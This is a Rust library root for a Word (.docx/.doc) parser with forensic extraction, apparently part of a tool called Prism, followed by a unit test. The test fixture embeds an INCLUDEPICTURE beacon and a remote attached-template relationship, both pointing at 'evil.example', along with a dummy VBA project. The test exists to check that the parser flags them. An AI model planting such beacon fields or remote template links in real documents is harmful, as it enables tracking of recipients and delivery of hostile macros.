// SPDX-License-Identifier: AGPL-3.0-only
//! Native Word document model (`WordDocument`), `.docx` / `.doc` readers, style inheritance,
//! and layout integration for Prism.

#![warn(missing_docs)]
#![warn(clippy::all, clippy::pedantic)]

pub mod doc;
pub mod docx;
pub mod emf;
pub mod inheritance;
pub mod layout;
pub mod model;
pub mod numbering;
pub mod udm;

pub use doc::{DEFAULT_MAX_DOC_STREAM_BYTES, is_doc_bytes, parse_doc};
pub use docx::{DEFAULT_MAX_ENTRY_BYTES, is_docx_zip, parse_docx};
pub use emf::{is_emf, is_metafile, is_wmf, render_metafile};
pub use inheritance::{MAX_STYLE_DEPTH, resolve_font_slots, resolve_word_color};
pub use layout::layout_word_document;
pub use model::{ForensicFacts, WordDocument};
pub use numbering::{FormattedListMarker, NumberingTracker, format_number, map_symbol_char};
pub use udm::word_to_udm;

#[cfg(test)]
mod tests {
    use super::*;
    use crate::model::{
        FieldKind, HeaderFooterKind, NumberFormat, ParagraphContent, RevisionKind,
        SectionBreakKind, WordAlignment, WordBlock,
    };
    use std::io::{Cursor, Write};

    const NS: &str = r#"xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main" xmlns:wp="http://schemas.openxmlformats.org/drawingml/2006/wordprocessingDrawing" xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships""#;

    fn build_docx_zip(parts: &[(&str, &[u8])]) -> Vec<u8> {
        let mut zip = zip::ZipWriter::new(Cursor::new(Vec::new()));
        let options = zip::write::FileOptions::default();
        for (name, data) in parts {
            zip.start_file(*name, options).unwrap();
            zip.write_all(data).unwrap();
        }
        zip.finish().unwrap().into_inner()
    }

    #[test]
    #[allow(clippy::too_many_lines)]
    fn parses_sections_numbering_settings_and_forensic_facts() {
        let doc_xml = format!(
            r#"<?xml version="1.0"?><w:document {NS}><w:body>
                <w:p>
                    <w:pPr>
                        <w:pStyle w:val="Heading1"/>
                        <w:numPr><w:ilvl w:val="0"/><w:numId w:val="1"/></w:numPr>
                        <w:sectPr>
                            <w:type w:val="continuous"/>
                            <w:pgSz w:w="12240" w:h="15840"/>
                            <w:cols w:num="2" w:space="720" w:sep="1"/>
                        </w:sectPr>
                    </w:pPr>
                    <w:r><w:t>Section One</w:t></w:r>
                </w:p>
                <w:p>
                    <w:r><w:fldChar w:fldCharType="begin"/></w:r>
                    <w:r><w:instrText> INCLUDEPICTURE "https://evil.example/beacon.png" </w:instrText></w:r>
                    <w:r><w:fldChar w:fldCharType="separate"/></w:r>
                    <w:r><w:t>[picture]</w:t></w:r>
                    <w:r><w:fldChar w:fldCharType="end"/></w:r>
                    <w:ins w:id="10" w:author="Alice" w:date="2025-01-01T00:00:00Z">
                        <w:r><w:t>Inserted</w:t></w:r>
                    </w:ins>
                </w:p>
                <w:sectPr>
                    <w:headerReference w:type="default" r:id="rIdHdr1"/>
                    <w:pgSz w:w="16838" w:h="11906" w:orient="landscape"/>
                </w:sectPr>
            </w:body></w:document>"#
        );
        let styles_xml = format!(
            r#"<?xml version="1.0"?><w:styles {NS}>
                <w:docDefaults>
                    <w:rPrDefault><w:rPr><w:sz w:val="22"/></w:rPr></w:rPrDefault>
                    <w:pPrDefault><w:pPr><w:spacing w:after="160"/></w:pPr></w:pPrDefault>
                </w:docDefaults>
                <w:style w:type="paragraph" w:default="1" w:styleId="Normal">
                    <w:name w:val="Normal"/>
                </w:style>
                <w:style w:type="paragraph" w:styleId="Heading1">
                    <w:name w:val="heading 1"/>
                    <w:basedOn w:val="Normal"/>
                    <w:pPr><w:keepNext/><w:outlineLvl w:val="0"/><w:jc w:val="center"/></w:pPr>
                    <w:rPr><w:b/><w:sz w:val="32"/></w:rPr>
                </w:style>
            </w:styles>"#
        );
        let numbering_xml = format!(
            r#"<?xml version="1.0"?><w:numbering {NS}>
                <w:abstractNum w:abstractNumId="0">
                    <w:lvl w:ilvl="0">
                        <w:start w:val="1"/>
                        <w:numFmt w:val="upperRoman"/>
                        <w:lvlText w:val="%1."/>
                        <w:pPr><w:ind w:left="720" w:hanging="360"/></w:pPr>
                    </w:lvl>
                </w:abstractNum>
                <w:num w:numId="1">
                    <w:abstractNumId w:val="0"/>
                </w:num>
            </w:numbering>"#
        );
        let settings_xml = format!(
            r#"<?xml version="1.0"?><w:settings {NS}>
                <w:defaultTabStop w:val="720"/>
                <w:evenAndOddHeaders/>
                <w:trackRevisions/>
                <w:attachedTemplate r:id="rIdTmpl"/>
                <w:docVars><w:docVar w:name="CaseID" w:val="FOO-42"/></w:docVars>
                <w:compat>
                    <w:compatSetting w:name="compatibilityMode" w:val="14"/>
                </w:compat>
            </w:settings>"#
        );
        let settings_rels = r#"<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
            <Relationship Id="rIdTmpl" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/attachedTemplate" Target="https://evil.example/normal.dotm" TargetMode="External"/>
        </Relationships>"#;
        let doc_rels = r#"<?xml version="1.0"?><Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
            <Relationship Id="rIdHdr1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/header" Target="header1.xml"/>
        </Relationships>"#;
        let header_xml = format!(
            r#"<?xml version="1.0"?><w:hdr {NS}><w:p><w:r><w:t>Confidential Header</w:t></w:r></w:p></w:hdr>"#
        );

        let bytes = build_docx_zip(&[
            ("word/document.xml", doc_xml.as_bytes()),
            ("word/styles.xml", styles_xml.as_bytes()),
            ("word/numbering.xml", numbering_xml.as_bytes()),
            ("word/settings.xml", settings_xml.as_bytes()),
            ("word/_rels/settings.xml.rels", settings_rels.as_bytes()),
            ("word/_rels/document.xml.rels", doc_rels.as_bytes()),
            ("word/header1.xml", header_xml.as_bytes()),
            ("word/vbaProject.bin", b"dummy-vba"),
        ]);

        let word_doc = parse_docx(&bytes, Some("evidence.docx"), DEFAULT_MAX_ENTRY_BYTES).unwrap();

        assert_eq!(word_doc.sections.len(), 2);
        assert_eq!(
            word_doc.sections[0].props.break_kind,
            SectionBreakKind::Continuous
        );
        assert_eq!(word_doc.sections[0].props.column_count, 2);
        assert!(word_doc.sections[0].props.column_separator);
        assert!(word_doc.sections[1].props.landscape);
        assert_eq!(
            word_doc.sections[1]
                .props
                .headers
                .get(&HeaderFooterKind::Default)
                .map(String::as_str),
            Some("rIdHdr1")
        );
        assert!(word_doc.headers.contains_key("rIdHdr1"));

        assert_eq!(word_doc.settings.compatibility_mode, 14);
        assert!(word_doc.settings.even_and_odd_headers);
        assert!(word_doc.settings.track_revisions);

        let WordBlock::Paragraph(ref p0) = word_doc.sections[0].blocks[0] else {
            panic!("expected paragraph");
        };
        let resolved_p0 = word_doc.styles.resolve_paragraph_style(
            p0.props.style_id.as_deref(),
            Some(&word_doc.numbering),
            &p0.props,
        );
        assert_eq!(resolved_p0.alignment, WordAlignment::Center);
        assert!(resolved_p0.keep_next);
        assert_eq!(resolved_p0.outline_level, Some(0));
        assert!((resolved_p0.indent_left_pt - 36.0).abs() < 0.01);
        assert!((resolved_p0.indent_first_line_pt - (-18.0)).abs() < 0.01);

        let lvl0 = word_doc.numbering.resolve_level(1, 0).unwrap();
        assert_eq!(lvl0.num_fmt, NumberFormat::UpperRoman);
        assert_eq!(lvl0.lvl_text, "%1.");

        let WordBlock::Paragraph(ref p1) = word_doc.sections[1].blocks[0] else {
            panic!("expected paragraph");
        };
        assert!(matches!(
            &p1.content[0],
            ParagraphContent::Field(f) if f.kind == FieldKind::IncludePicture("https://evil.example/beacon.png".to_string())
        ));
        let runs = p1.runs();
        assert_eq!(runs.len(), 2);
        assert_eq!(
            runs[1].revision.as_ref().map(|r| r.kind),
            Some(RevisionKind::Inserted)
        );

        assert!(word_doc.forensic.vba_project_present);
        assert_eq!(
            word_doc.forensic.attached_template.as_deref(),
            Some("https://evil.example/normal.dotm")
        );
        assert_eq!(
            word_doc
                .forensic
                .document_variables
                .get("CaseID")
                .map(String::as_str),
            Some("FOO-42")
        );
        assert_eq!(word_doc.forensic.revision_authors, vec!["Alice"]);
        assert_eq!(word_doc.forensic.revision_count, 1);
        assert_eq!(word_doc.forensic.external_relationships.len(), 2);
    }
}
